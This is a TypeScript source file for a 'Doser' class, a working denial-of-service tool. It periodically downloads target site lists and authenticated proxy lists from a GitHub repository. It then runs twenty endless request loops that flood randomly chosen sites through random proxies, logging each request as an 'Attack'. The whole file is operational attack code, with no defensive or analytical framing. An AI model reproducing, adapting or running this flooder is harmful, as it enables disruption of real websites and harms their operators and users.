import axios from 'axios-https-proxy-fix'
import { EventEmitter } from 'events'

interface ProxyData {
  ip: string;
  auth: string;
}

interface SiteData {
  page: string;
}

interface TargetsData {
  sites: Array<SiteData>;
  proxies: Array<ProxyData>;
}

export class Doser {
  private working: boolean
  private eventSource: EventEmitter

  private loadedTargetsAndProxies: TargetsData | null = null;
  private targetsAndProxiesInterval?: NodeJS.Timer;
  // private compactRequestsArrayInterval?: NodeJS.Timer;

  // Attack settings
  private maxRequestCount = 20;

  private requestsPromises: Array<any> = [];

  constructor () {
    this.working = false;
    this.eventSource = new EventEmitter();

    // Update data repeatedly
    this.targetsAndProxiesInterval = setInterval(() => {
      this.updateTargetsAndProxies();
    }, 300000)
  }

  private async updateTargetsAndProxies() {
    try {
      const data = await this.getSitesAndProxies()
      this.loadedTargetsAndProxies = data
    } catch(e: any) {
      console.log('Unable to update data')
    }
  }

  async getSitesAndProxies (): Promise<TargetsData | null> {
    try {
      console.log('Loading targets and proxies;')
      const sitesResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })
      const proxyResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })

      if (sitesResponse.status === 200 && proxyResponse.status === 200) {
        const sites: SiteData[] = sitesResponse.data as Array<SiteData>
        const proxies: ProxyData[] = proxyResponse.data as Array<ProxyData>

        console.log('Targets and proxies were loaded;')
        return {
          sites,
          proxies
        }
      } else {
        throw new Error('Bad request, cannot get targets and proxies')
      }
    } catch (e) {
      console.log('Error while loading hosts and proxies: ', e)
    }

    return null;
  }

  async start () {
    await this.updateTargetsAndProxies();

    for (let i = 0; i < this.maxRequestCount; i++) {
      this.generateRequestPromise(i).then().catch(e => console.error(e));
    }
  }

  async generateRequestPromise(promiseIndex: number) {
    if(!this.loadedTargetsAndProxies) {
      console.log('No target or proxies')
      return;
    }

    const {sites, proxies} = this.loadedTargetsAndProxies;
    const randomSite = sites[Math.floor(Math.random() * sites.length)]; //Get random site
    const randomProxy = proxies[Math.floor(Math.random() * proxies.length)]; //Get random proxy
    // console.log('data:: ', randomProxy, randomSite)

    const proxyAddressSplit = randomProxy.ip.split(':')
    const proxyIP = proxyAddressSplit[0]
    const proxyPort = parseInt(proxyAddressSplit[1])
    const proxyAuthSplit = randomProxy.auth.split(':')
    const proxyUsername = proxyAuthSplit[0]
    const proxyPassword = proxyAuthSplit[1]

    const promise = axios.get(
      randomSite.page,
      {
        timeout: 5000,
        validateStatus: () => true,
        proxy: {
          host: proxyIP,
          port: proxyPort,
          auth: {
            username: proxyUsername,
            password: proxyPassword
          }
        }
      }
    );

    try{
      const result = await promise;
      console.log(`Attack: ${randomSite.page} | ${result.status}`);
    } catch(e: any) {
      console.log(`Fail: ${randomSite.page} | ${e.code} `);
    }

    this.generateRequestPromise(promiseIndex);
  }
}
